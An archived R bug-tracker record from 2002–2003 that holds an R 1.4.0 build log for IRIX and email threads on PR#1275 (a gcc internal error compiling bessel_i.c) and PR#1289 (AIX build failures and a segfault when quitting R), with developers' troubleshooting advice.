creating src/include/config.h
configure: warning: you cannot build DVI versions of the R manuals
configure: warning: you cannot build PDF versions of the R manuals


R is now configured for mips-sgi-irix6.5

  Source directory:          .
  Installation directory:    /software/r-1
  C compiler:                gcc  -g -O2
  C++ compiler:              g++  -g -O2
  FORTRAN compiler:          g77  -g -O2

  X11 support:               yes
  Gnome support:             no
  Tcl/Tk support:            no

  R profiling support:       yes
  R as a shared library:     no

	cd build/R-1.4.0 \
	&&  make  all \
	&& touch XHIER_BUILT
creating src/scripts/R.fe
mkdir ../../bin
mkdir ../../include
mkdir ../../../include/R_ext
making approx.d from approx.c
making bakslv.d from bakslv.c
making bandwidths.d from bandwidths.c
making binning.d from binning.c
making chull.d from chull.c
making cpoly.d from cpoly.c
making cumsum.d from cumsum.c
making fft.d from fft.c
making fmin.d from fmin.c
making integrate.d from integrate.c
making lbfgsb.d from lbfgsb.c
making loglin.d from loglin.c
making lowess.d from lowess.c
making machar.d from machar.c
making maxcol.d from maxcol.c
making massdist.d from massdist.c
making pretty.d from pretty.c
making rowsum.d from rowsum.c
making splines.d from splines.c
making stem.d from stem.c
making strsignif.d from strsignif.c
making tabulate.d from tabulate.c
making uncmin.d from uncmin.c
making zeroin.d from zeroin.c
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c approx.c -o approx.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c bakslv.c -o bakslv.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c bandwidths.c -o bandwidths.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c binning.c -o binning.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c chull.c -o chull.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c cpoly.c -o cpoly.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c cumsum.c -o cumsum.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c fft.c -o fft.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c fmin.c -o fmin.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c integrate.c -o integrate.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c lbfgsb.c -o lbfgsb.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c loglin.c -o loglin.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c lowess.c -o lowess.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c machar.c -o machar.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c maxcol.c -o maxcol.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c massdist.c -o massdist.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c pretty.c -o pretty.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c rowsum.c -o rowsum.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c splines.c -o splines.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c stem.c -o stem.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c strsignif.c -o strsignif.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c tabulate.c -o tabulate.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c uncmin.c -o uncmin.o
	gcc -I. -I../../src/include -I../../src/include  -DHAVE_CONFIG_H   -g -O2 -c zeroin.c -o zeroin.o
	g77   -g -O2 -c ch2inv.f -o ch2inv.o
	g77   -g -O2 -c chol.f -o chol.o
	g77   -g -O2 -c dpbfa.f -o dpbfa.o
	g77   -g -O2 -c dpbsl.f -o dpbsl.o
	g77   -g -O2 -c dpoco.f -o dpoco.o
	g77   -g -O2 -c dpodi.f -o dpodi.o
	g77   -g -O2 -c dpofa.f -o dpofa.o
	g77   -g -O2 -c dposl.f -o dposl.o
	g77   -g -O2 -c dqrdc.f -o dqrdc.o
	g77   -g -O2 -c dqrdc2.f -o dqrdc2.o
	g77   -g -O2 -c dqrls.f -o dqrls.o
	g77   -g -O2 -c dqrsl.f -o dqrsl.o
	g77   -g -O2 -c dqrutl.f -o dqrutl.o
	g77   -g -O2 -c dsvdc.f -o dsvdc.o
	g77   -g -O2 -c dtrco.f -o dtrco.o
	g77   -g -O2 -c dtrsl.f -o dtrsl.o
	g77   -g -O2 -c eigen.f -o eigen.o
	g77   -g -O2 -c lminfl.f -o lminfl.o
	ar cr libappl.a approx.o  bakslv.o bandwidths.o binning.o  chull.o cpoly.o cumsum.o  fft.o fmin.o integrate.o lbfgsb.o loglin.o lowess.o  machar.o maxcol.o massdist.o  pretty.o  rowsum.o  splines.o stem.o strsignif.o  tabulate.o  uncmin.o  zeroin.o ch2in

v.o chol.o  dpbfa.o dpbsl.o dpoco.o dpodi.o dpofa.o dposl.o dqrdc.o  dqrdc2.o dqrls.o dqrsl.o dqrutl.o dsvdc.o dtrco.o dtrsl.o  eigen.o  lminfl.o 
	: libappl.a
making mlutils.d from mlutils.c
making d1mach.d from d1mach.c
making i1mach.d from i1mach.c
making fmax2.d from fmax2.c
making fmin2.d from fmin2.c
making fprec.d from fprec.c
making fround.d from fround.c
making ftrunc.d from ftrunc.c
making sign.d from sign.c
making fsign.d from fsign.c
making imax2.d from imax2.c
making imin2.d from imin2.c
making chebyshev.d from chebyshev.c
making log1p.d from log1p.c
making lgammacor.d from lgammacor.c
making gammalims.d from gammalims.c
making stirlerr.d from stirlerr.c
making bd0.d from bd0.c
making gamma.d from gamma.c
making lgamma.d from lgamma.c
making gamma_cody.d from gamma_cody.c
making beta.d from beta.c
making lbeta.d from lbeta.c
making polygamma.d from polygamma.c
making bessel_i.d from bessel_i.c
making bessel_j.d from bessel_j.c
making bessel_k.d from bessel_k.c
making bessel_y.d from bessel_y.c
making choose.d from choose.c
making snorm.d from snorm.c
making sexp.d from sexp.c
making dgamma.d from dgamma.c
making pgamma.d from pgamma.c
making qgamma.d from qgamma.c
making rgamma.d from rgamma.c
making dbeta.d from dbeta.c
making pbeta.d from pbeta.c
making qbeta.d from qbeta.c
making rbeta.d from rbeta.c
making dunif.d from dunif.c
making punif.d from punif.c
making qunif.d from qunif.c
making runif.d from runif.c
making dnorm.d from dnorm.c
making pnorm.d from pnorm.c
making qnorm.d from qnorm.c
making rnorm.d from rnorm.c
making dlnorm.d from dlnorm.c

==> 1275.reply.1 <==
From p.dalgaard@biostat.ku.dk  Tue Jan 22 16:29:23 2002
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA20580;
	Tue, 22 Jan 2002 16:29:22 +0100 (MET)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id g0MFRjp00671;
	Tue, 22 Jan 2002 16:27:45 +0100
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
Sender: pd@pubhealth.ku.dk
To: wtautz@math.uwaterloo.ca
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] compile problem with bessel_i.c on IRIX64 flexor 6.5 10100655 IP35 (uname -a) (PR#1275)
References: <200201221505.QAA20274@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 22 Jan 2002 16:27:45 +0100
In-Reply-To: <200201221505.QAA20274@pubhealth.ku.dk>
Message-ID: <x2elki4d8u.fsf@blueberry.kubism.ku.dk>
Lines: 37
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

wtautz@math.uwaterloo.ca writes:

> I have included the full configure/make output:
> (the particular error regarding bessel_i.c is at
> the END of the report). 
...
> bessel_i.c: In function `I_bessel':
> bessel_i.c:468: internal error--unrecognizable insn:
> (insn 1418 1417 673 (set:DF (reg/v:DF 101)
>         (if_then_else:DF (ne (reg:DI 416)
>                 (const_int 0 [0x0]))
>             (reg/v:DF 101)
>             (reg:DF 415))) -1 (insn_list 1417 (nil))
>     (expr_list:REG_DEAD (reg:DI 416)
>         (nil)))
> *** Error code 1 (bu21)
> *** Error code 1 (bu21)
> *** Error code 1 (bu21)
> *** Error code 1 (bu21)
> *** Error code 1 (bu21)

That looks like a problem in the gcc compiler suite. You might try
upgrading the compiler. Sometimes changing compiler flags (you would
only need to do it for the offending module) does the trick. 

Another possibility is that gcc is generating code that the system
assembler doesn't understand (this is happening with gcc 3 on
Solaris). If so, then you might install GNU binutils.

If none of this helps, I'm afraid that you need to take it up with the
GCC authors since it is not an R problem.

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1275.followup.1 <==
From wtautz@math.uwaterloo.ca  Tue Jan 22 16:48:52 2002
Received: from mfcf.math.uwaterloo.ca (wtautz@mfcf.math.uwaterloo.ca [129.97.216.156])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA20899;
	Tue, 22 Jan 2002 16:48:49 +0100 (MET)
Received: from localhost (wtautz@localhost)
	by mfcf.math.uwaterloo.ca (8.9.3/8.9.3) with SMTP id KAA14370;
	Tue, 22 Jan 2002 10:48:18 -0500 (EST)
X-Authentication-Warning: mfcf.math: wtautz owned process doing -bs
Date: Tue, 22 Jan 2002 10:48:18 -0500 (EST)
From: Walter Tautz <wtautz@math.uwaterloo.ca>
Reply-To: Walter Tautz <wtautz@math.uwaterloo.ca>
To: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk,
        Walter Tautz <wtautz@math.uwaterloo.ca>
Subject: Re: [Rd] compile problem with bessel_i.c on IRIX64 flexor 6.5 10100655 IP35 (uname -a) (PR#1275)
In-Reply-To: <x2elki4d8u.fsf@blueberry.kubism.ku.dk>
Message-ID: <Pine.SOL.3.96.1020122103116.3015L-100000@mfcf.math.uwaterloo.ca>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII



On 22 Jan 2002, Peter Dalgaard BSA wrote:

> wtautz@math.uwaterloo.ca writes:
> 
> > I have included the full configure/make output:
> > (the particular error regarding bessel_i.c is at
> > the END of the report). 
> ...
> > bessel_i.c: In function `I_bessel':
> > bessel_i.c:468: internal error--unrecognizable insn:
> > (insn 1418 1417 673 (set:DF (reg/v:DF 101)
> >         (if_then_else:DF (ne (reg:DI 416)
> >                 (const_int 0 [0x0]))
> >             (reg/v:DF 101)
> >             (reg:DF 415))) -1 (insn_list 1417 (nil))
> >     (expr_list:REG_DEAD (reg:DI 416)
> >         (nil)))
> > *** Error code 1 (bu21)
> > *** Error code 1 (bu21)
> > *** Error code 1 (bu21)
> > *** Error code 1 (bu21)
> > *** Error code 1 (bu21)
> 
> That looks like a problem in the gcc compiler suite. You might try
> upgrading the compiler. Sometimes changing compiler flags (you would
> only need to do it for the offending module) does the trick. 
> 
> Another possibility is that gcc is generating code that the system
> assembler doesn't understand (this is happening with gcc 3 on
> Solaris). If so, then you might install GNU binutils.
> 

I neglected to mention that 
gcc -v gives:

gcc version 2.95.3 20010315 (release)



Here is a more verbose output if that helps:




Reading specs from /.software/arch/gcc-2.95.3/distribution/lib/gcc-lib/mips-sgi-irix6.5/2.95.3/specs
gcc version 2.95.3 20010315 (release)
 /.software/arch/gcc-2.95.3/distribution/lib/gcc-lib/mips-sgi-irix6.5/2.95.3/cpp0 -lang-c -v -I. -I../../src/include -I../../src/include -D__GNUC__=2 -D__GNUC_MINOR__=95 -Dunix -Dmips -Dsgi -Dhost_mips -DMIPSEB -D_MIPSEB -DSYSTYPE_SVR4 -D_LONGLONG -D_SVR4
_SOURCE -D_MODERN_C -D__DSO__ -D__unix__ -D__mips__ -D__sgi__ -D__host_mips__ -D__MIPSEB__ -D_MIPSEB -D__SYSTYPE_SVR4__ -D_LONGLONG -D_SVR4_SOURCE -D_MODERN_C -D__DSO__ -D__unix -D__mips -D__sgi -D__host_mips -D__MIPSEB -D__SYSTYPE_SVR4 -Asystem(unix) -As
ystem(svr4) -Acpu(mips) -Amachine(sgi) -D__CHAR_UNSIGNED__ -D__OPTIMIZE__ -g -D__LANGUAGE_C -D_LANGUAGE_C -DLANGUAGE_C -D__SIZE_TYPE__=long unsigned int -D__PTRDIFF_TYPE__=long int -D__LONG_MAX__=9223372036854775807L -D__EXTENSIONS__ -D_SGI_SOURCE -D_MIPS
_FPSET=32 -D_MIPS_ISA=_MIPS_ISA_MIPS3 -D_ABI64=3 -D_MIPS_SIM=_ABI64 -D_MIPS_SZINT=32 -D_MIPS_SZLONG=64 -D_MIPS_SZPTR=64 -D_COMPILER_VERSION=601 -U__mips -D__mips=3 -D__mips64 -DHAVE_CONFIG_H bessel_i.c /var/tmp/ccyhjiCa.i
GNU CPP version 2.95.3 20010315 (release) [AL 1.1, MM 40] SGI running IRIX 6.x
#include "..." search starts here:
#include <...> search starts here:
 .
 ../../src/include
 /.software/arch/gcc-2.95.3/distribution/lib/gcc-lib/mips-sgi-irix6.5/2.95.3/../../../../mips-sgi-irix6.5/include
 /.software/arch/gcc-2.95.3/distribution/lib/gcc-lib/mips-sgi-irix6.5/2.95.3/include
 /usr/include
End of search list.
The following default directories have been omitted from the search path:
 /.software/arch/gcc-2.95.3/distribution/lib/gcc-lib/mips-sgi-irix6.5/2.95.3/../../../../include/g++-3
 /usr/local/include
End of omitted list.
 /.software/arch/gcc-2.95.3/distribution/lib/gcc-lib/mips-sgi-irix6.5/2.95.3/cc1 /var/tmp/ccyhjiCa.i -quiet -dumpbase bessel_i.c -mabi=64 -g -O2 -version -o /var/tmp/ccKOSzid.s
GNU C version 2.95.3 20010315 (release) (mips-sgi-irix6.5) compiled by GNU C version 2.95.3 20010315 (release).
bessel_i.c: In function `I_bessel':
bessel_i.c:468: internal error--unrecognizable insn:
(insn 1418 1417 673 (set:DF (reg/v:DF 101)
        (if_then_else:DF (ne (reg:DI 416)
                (const_int 0 [0x0]))
            (reg/v:DF 101)
            (reg:DF 415))) -1 (insn_list 1417 (nil))
    (expr_list:REG_DEAD (reg:DI 416)
        (nil)))


==> 1275.audit <==
Thu Jan 24 15:40:40 2002	ripley	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1289 *
Subject: R 1.4.0 build fails on AIX
From: lio@hpss1.ccs.ornl.gov
Date: Wed, 30 Jan 2002 14:10:30 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1289 <==
From lio@hpss1.ccs.ornl.gov  Wed Jan 30 14:10:31 2002
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA19022
	for <R-bugs@biostat.ku.dk>; Wed, 30 Jan 2002 14:10:30 +0100 (MET)
Date: Wed, 30 Jan 2002 14:10:30 +0100 (MET)
From: lio@hpss1.ccs.ornl.gov
Message-Id: <200201301310.OAA19022@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: R 1.4.0 build fails on AIX

Full_Name: Daniel L. Million
Version: 1.4.0
OS: AIX 5.1 and 4.3.3
Submission from: (NULL) (160.91.192.125)


Is there any guidance available on building R on AIX?  Specifically, which C 
compiler to use?  We have AIX XL Fortran version 7.1.1.  We also have AIX 
Visual Age C version 5.0.2.  We also have gcc available.

I have tried building with "cc" (the default AIX compiler) and "gcc".  During
the "make", C compilation in src/library/methods/src completes, and then I 
see this:

mkdir ../../../../library/methods/libs
dumping R code in package `methods'
make: 1254-059 The signal code from the last command is 11.

Apparently the make is running R.bin, which coredumps with a segmentation
violation.

Do I need to be using a thread-safe compiler (e.g., "cc_r") for this build?
Any clues at all as to how to get around this?

Thanks.

Dan Million


==> 1289.followup.1 <==
From tlumley@u.washington.edu  Wed Jan 30 17:46:32 2002
Received: from jason04.u.washington.edu (jason04.u.washington.edu [140.142.8.53])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id RAA23476
	for <R-bugs@biostat.ku.dk>; Wed, 30 Jan 2002 17:46:31 +0100 (MET)
Received: from homer40.u.washington.edu (homer40.u.washington.edu [140.142.16.6])
	by jason04.u.washington.edu (8.12.1+UW01.12/8.12.1+UW02.01) with ESMTP id g0UGjs9Y020226;
	Wed, 30 Jan 2002 08:45:54 -0800
Received: from localhost (tlumley@localhost)
	by homer40.u.washington.edu (8.12.1+UW01.12/8.12.1+UW02.01) with ESMTP id g0UGjru1095332;
	Wed, 30 Jan 2002 08:45:53 -0800
Date: Wed, 30 Jan 2002 08:45:53 -0800 (PST)
From: Thomas Lumley <tlumley@u.washington.edu>
To: lio@hpss1.ccs.ornl.gov
cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] R 1.4.0 build fails on AIX (PR#1289)
In-Reply-To: <200201301310.OAA19034@pubhealth.ku.dk>
Message-ID: <Pine.A41.4.44.0201300827470.74956-100000@homer40.u.washington.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Wed, 30 Jan 2002 lio@hpss1.ccs.ornl.gov wrote:

> Full_Name: Daniel L. Million
> Version: 1.4.0
> OS: AIX 5.1 and 4.3.3
> Submission from: (NULL) (160.91.192.125)
>
>
> Is there any guidance available on building R on AIX?  Specifically, which C
> compiler to use?  We have AIX XL Fortran version 7.1.1.  We also have AIX
> Visual Age C version 5.0.2.  We also have gcc available.
>
> I have tried building with "cc" (the default AIX compiler) and "gcc".  During
> the "make", C compilation in src/library/methods/src completes, and then I
> see this:
>
> mkdir ../../../../library/methods/libs
> dumping R code in package `methods'
> make: 1254-059 The signal code from the last command is 11.
>
> Apparently the make is running R.bin, which coredumps with a segmentation
> violation.
>
> Do I need to be using a thread-safe compiler (e.g., "cc_r") for this build?
> Any clues at all as to how to get around this?


I have successfully built most recent versions of R including 1.4.0 with
gcc/g77 and with "C for AIX version 5"/"XL Fortran for AIX" on AIX 4.3. I
haven't been able to mix the GNU and IBM compilers, but I haven't tried
recently.  Last week I compiled R-patched successfully using gcc/g77. I
didn't have to do anything special, but AIX has often been source of
configuration bugs.

You could try not building the methods package: edit  Makeconf in the top
R/ directory and remove methods from R_PKGS.

Also, I think that it's possible to have the methods package build in the
usual source form rather than as a saved image. I don't know how, but John
Chambers or Duncan Temple Lang may be able to help.

These wouldn't actually fix the problem, but would enable you to compile
everything else.

I'll try again with the AIX compilers and the new R 1.4.1. It's possible
that there have been some changes since I last tried, since I usually do
this shortly before a release.

	-thomas



==> 1289.followup.2 <==
From lio@hpss1.ccs.ornl.gov  Wed Jan 30 20:49:57 2002
Received: from hpss1.ccs.ornl.gov (hpss1.ccs.ornl.gov [160.91.192.125])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA24914
	for <R-bugs@biostat.ku.dk>; Wed, 30 Jan 2002 20:49:56 +0100 (MET)
Received: from localhost (lio@localhost)
	by hpss1.ccs.ornl.gov (AIX4.3/8.9.3/8.9.1) with ESMTP id OAA18340;
	Wed, 30 Jan 2002 14:49:04 -0500
Date: Wed, 30 Jan 2002 14:49:04 -0500 (EST)
From: Dan Million <lio@hpss1.ccs.ornl.gov>
To: Thomas Lumley <tlumley@u.washington.edu>
cc: <r-devel@stat.math.ethz.ch>, <R-bugs@biostat.ku.dk>,
        Dan Million <lio@hpss1.ccs.ornl.gov>
Subject: Re: [Rd] R 1.4.0 build fails on AIX (PR#1289)
In-Reply-To: <Pine.A41.4.44.0201300827470.74956-100000@homer40.u.washington.edu>
Message-ID: <Pine.A41.4.31.0201301446540.16064-100000@hpss1.ccs.ornl.gov>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Wed, 30 Jan 2002, Thomas Lumley wrote:

> On Wed, 30 Jan 2002 lio@hpss1.ccs.ornl.gov wrote:
>
> > Full_Name: Daniel L. Million
> > Version: 1.4.0
> > OS: AIX 5.1 and 4.3.3
> > Submission from: (NULL) (160.91.192.125)
> >
> >
> > Is there any guidance available on building R on AIX?  Specifically, which C
> > compiler to use?  We have AIX XL Fortran version 7.1.1.  We also have AIX
> > Visual Age C version 5.0.2.  We also have gcc available.
> >
> > I have tried building with "cc" (the default AIX compiler) and "gcc".  During
> > the "make", C compilation in src/library/methods/src completes, and then I
> > see this:
> >
> > mkdir ../../../../library/methods/libs
> > dumping R code in package `methods'
> > make: 1254-059 The signal code from the last command is 11.
> >
> > Apparently the make is running R.bin, which coredumps with a segmentation
> > violation.
> >
> > Do I need to be using a thread-safe compiler (e.g., "cc_r") for this build?
> > Any clues at all as to how to get around this?
>
>
> I have successfully built most recent versions of R including 1.4.0 with
> gcc/g77 and with "C for AIX version 5"/"XL Fortran for AIX" on AIX 4.3. I
> haven't been able to mix the GNU and IBM compilers, but I haven't tried
> recently.  Last week I compiled R-patched successfully using gcc/g77. I
> didn't have to do anything special, but AIX has often been source of
> configuration bugs.
>
> You could try not building the methods package: edit  Makeconf in the top
> R/ directory and remove methods from R_PKGS.
>
> Also, I think that it's possible to have the methods package build in the
> usual source form rather than as a saved image. I don't know how, but John
> Chambers or Duncan Temple Lang may be able to help.
>
> These wouldn't actually fix the problem, but would enable you to compile
> everything else.
>
> I'll try again with the AIX compilers and the new R 1.4.1. It's possible
> that there have been some changes since I last tried, since I usually do
> this shortly before a release.
>
> 	-thomas

Thanks for the reply.  I tried building without the modules package, and
got past that point.  Now the build fails trying to link tcltk.so.  Seems
the tclConfig.sh on my host refers to a file that does not exist
(/opt/freeware/src/packages/BUILD/tcltk-8.3.3/tcl8.3.3/unix/lib.exp).

I'll freely admit to being clueless about most of this.  I don't know
anything about R; I'm just a sysadmin trying to build/install it for a
user who needs it.

Dan



==> 1289.followup.3 <==
From tlumley@u.washington.edu  Wed Jan 30 21:18:08 2002
Received: from jason03.u.washington.edu (jason03.u.washington.edu [140.142.8.11])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA25053
	for <R-bugs@biostat.ku.dk>; Wed, 30 Jan 2002 21:18:07 +0100 (MET)
Received: from homer04.u.washington.edu (homer04.u.washington.edu [140.142.15.38])
	by jason03.u.washington.edu (8.12.1+UW01.12/8.12.1+UW02.01) with ESMTP id g0UKHUPE052646;
	Wed, 30 Jan 2002 12:17:30 -0800
Received: from localhost (tlumley@localhost)
	by homer04.u.washington.edu (8.12.1+UW01.12/8.12.1+UW02.01) with ESMTP id g0UKHTUO036174;
	Wed, 30 Jan 2002 12:17:29 -0800
Date: Wed, 30 Jan 2002 12:17:29 -0800 (PST)
From: Thomas Lumley <tlumley@u.washington.edu>
To: Dan Million <lio@hpss1.ccs.ornl.gov>
cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] R 1.4.0 build fails on AIX (PR#1289)
In-Reply-To: <Pine.A41.4.31.0201301446540.16064-100000@hpss1.ccs.ornl.gov>
Message-ID: <Pine.A41.4.44.0201301155360.117500-100000@homer04.u.washington.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Wed, 30 Jan 2002, Dan Million wrote:

> Thanks for the reply.  I tried building without the modules package, and
> got past that point.  Now the build fails trying to link tcltk.so.  Seems
> the tclConfig.sh on my host refers to a file that does not exist
> (/opt/freeware/src/packages/BUILD/tcltk-8.3.3/tcl8.3.3/unix/lib.exp).
>
> I'll freely admit to being clueless about most of this.  I don't know
> anything about R; I'm just a sysadmin trying to build/install it for a
> user who needs it.

Our autodetection of tcl/tk is less reliable than most stuff, partly
because the tclConfig.sh and similar files are sometimes inaccurate.  If
your users don't need tcl/tk (which is a fairly low-level set of
facilities for writing GUIs) you can again remove tcltk from the R_PKGS
line of Makeconf, or reconfigure
   ./configure --without-tcltk

If your users do need this package then you (or they) need to track down
where tcl and tk lurk and provide this information to R. Probably the
easiest way would be to install a new version of Tcl and Tk, which should
produce an honest set of configuration files.

	-thomas


==> 1289.followup.4 <==
From lio@hpss1.ccs.ornl.gov  Thu Jan 31 19:36:53 2002
Received: from hpss1.ccs.ornl.gov (hpss1.ccs.ornl.gov [160.91.192.125])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA08024
	for <R-bugs@biostat.ku.dk>; Thu, 31 Jan 2002 19:36:52 +0100 (MET)
Received: from localhost (lio@localhost)
	by hpss1.ccs.ornl.gov (AIX4.3/8.9.3/8.9.1) with ESMTP id NAA24034;
	Thu, 31 Jan 2002 13:36:00 -0500
Date: Thu, 31 Jan 2002 13:36:00 -0500 (EST)
From: Dan Million <lio@hpss1.ccs.ornl.gov>
To: Thomas Lumley <tlumley@u.washington.edu>
cc: <r-devel@stat.math.ethz.ch>, <R-bugs@biostat.ku.dk>,
        Dan Million <lio@hpss1.ccs.ornl.gov>
Subject: Re: [Rd] R 1.4.0 build fails on AIX (PR#1289)
In-Reply-To: <Pine.A41.4.44.0201301155360.117500-100000@homer04.u.washington.edu>
Message-ID: <Pine.A41.4.31.0201311327400.23486-100000@hpss1.ccs.ornl.gov>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Wed, 30 Jan 2002, Thomas Lumley wrote:

> On Wed, 30 Jan 2002, Dan Million wrote:
>
> > Thanks for the reply.  I tried building without the modules package, and
> > got past that point.  Now the build fails trying to link tcltk.so.  Seems
> > the tclConfig.sh on my host refers to a file that does not exist
> > (/opt/freeware/src/packages/BUILD/tcltk-8.3.3/tcl8.3.3/unix/lib.exp).
>
> Our autodetection of tcl/tk is less reliable than most stuff, partly
> because the tclConfig.sh and similar files are sometimes inaccurate.  If
> your users don't need tcl/tk (which is a fairly low-level set of
> facilities for writing GUIs) you can again remove tcltk from the R_PKGS
> line of Makeconf, or reconfigure
>    ./configure --without-tcltk
>
> If your users do need this package then you (or they) need to track down
> where tcl and tk lurk and provide this information to R. Probably the
> easiest way would be to install a new version of Tcl and Tk, which should
> produce an honest set of configuration files.

I installed and built the Tcl/Tk source RPM, and now the file that R wants
is there.  By skipping the "modules" packages, the build gets all the way
to the end.

"make check" fails rather quickly:

    running code in `base-Ex.R' .../bin/sh: 51598 Illegal
	instruction(coredump)
    make: 1254-004 The error code from the last command is 1.

When I try to run R, I get the opening info and then a "> " prompt.
I can type simple commands like help(), but whenever I type q() to
quit, I get a coredump.  This is consistent with what I saw earlier when
the build was trying to load "modules".  The stack trace in the coredump
contains this:

Segmentation fault in spin_lock_global_ppc_mp at 0xd0106644 ($t1)
0xd0106644 (spin_lock_global_ppc_mp+0x24) 7ce5192d     stwcx.   r7,r5,r3
(dbx) where
spin_lock_global_ppc_mp() at 0xd0106644
_rec_mutex_lock(??) at 0xd0170d48
__ct__Q2_3std7_LockitFi(??, ??) at 0xd0bb3a18
__dt__Q2_3std6_WinitFv(??, ??) at 0xd0bdad18
__srterm__7__Fv() at 0xd0bcbe04
exit(??) at 0xd0177c40
Rstd_CleanUp(0x3, 0x0, 0x1), line 529 in "sys-std.c"

It almost looks like R is working OK until it calls "exit", and then it
blows up.

Dan



==> 1289.audit <==
Fri Feb  1 21:55:34 2002	ripley	moved from incoming to System-specific

==> 1289.followup.5 <==
From harald@cepba.upc.es Mon May  5 17:53:44 2003
Received: from dukas.upc.es (dukas.upc.es [147.83.2.62])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h45Frh2b016029
	for <r-bugs@biostat.ku.dk>; Mon, 5 May 2003 17:53:43 +0200 (MET DST)
Received: from amen.cepba.upc.es (amen.cepba.upc.es [147.83.42.19])
	by dukas.upc.es (8.12.1/8.12.1) with ESMTP id h45Frg9J012974
	for <r-bugs@biostat.ku.dk>; Mon, 5 May 2003 17:53:42 +0200 (MET DST)
Received: from cepba.upc.es (amen.cepba.upc.es [147.83.42.19])
	by amen.cepba.upc.es (SGI-8.9.3/8.9.3) with ESMTP id RAA51323
	for <r-bugs@biostat.ku.dk>; Mon, 5 May 2003 17:54:40 +0200 (CEST)
Sender: harald@cepba.upc.es
Message-ID: <3EB68940.F8718856@cepba.upc.es>
Date: Mon, 05 May 2003 17:54:40 +0200
From: Harald Servat Gelabert <harald@cepba.upc.es>
X-Mailer: Mozilla 4.77C-SGI [en] (X11; I; IRIX64 6.5 IP28)
X-Accept-Language: en
MIME-Version: 1.0
To: r-bugs@biostat.ku.dk
Subject: (PR#1289)
Content-Type: text/plain; charset=iso-8859-1
Content-Transfer-Encoding: 8bit

Dear all,

I've found a bug report for R when installing it on an AIX5.1 system.
There's a followup (number 4) that comments a segmentation fault on R
when quitting "q()".

I'm using a newer version of R but on the same operating system and
I obtain the same error.

There was a way to solve this problem?

Best regards and thanks,

-- 
________________________________________________________________________
             Harald Servat Gelabert (harald@cepba.upc.es)
   o//o      Centre Europeu de Paral.lelisme de Barcelona          CEPBA
  o//o       WWW...: http://www.cepba.upc.es       Tel: +34-93-401 74 23
